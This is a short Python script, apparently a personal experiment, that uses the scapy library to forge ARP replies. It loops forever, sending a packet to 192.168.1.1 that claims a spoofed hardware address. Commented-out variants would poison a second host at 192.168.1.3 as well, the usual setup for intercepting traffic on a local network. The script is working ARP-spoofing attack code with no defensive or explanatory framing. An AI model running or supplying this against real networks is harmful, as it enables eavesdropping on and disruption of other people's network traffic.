from scapy.all import *
#pkt = ARP(pdst='192.168.1.1', psrc='192.168.1.3')
#pkt = ARP(hwdst='08:c6:b3:11:12:c1', hwsrc='00:db:df:88:4f:e6')
pkt = ARP(pdst='192.168.1.1', hwsrc='00:db:df:88:4f:e6')

#pkt1 = ARP(pdst='192.168.1.3', psrc='192.168.1.1')
#pkt1 = ARP(hwdst='08:c6:b3:11:12:c1', hwsrc='00:db:df:88:4f:e6')
#pkt1 = ARP(pdst='192.168.1.3', hwsrc='00:db:df:88:4f:e6')
while True:
	send(pkt, inter=2)
#	send(pkt1,inter=2)
